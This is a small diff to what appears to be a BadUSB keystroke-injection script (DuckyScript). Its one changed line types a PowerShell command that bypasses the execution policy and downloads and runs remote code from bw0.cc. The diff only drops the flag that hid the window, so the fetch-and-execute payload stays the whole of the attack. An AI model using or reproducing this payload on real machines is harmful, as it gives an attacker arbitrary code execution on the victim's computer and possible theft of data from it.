@@ -10,7 +10,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C iex (irm bw0.cc/netw)
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/netw)
 ENTER
 
 
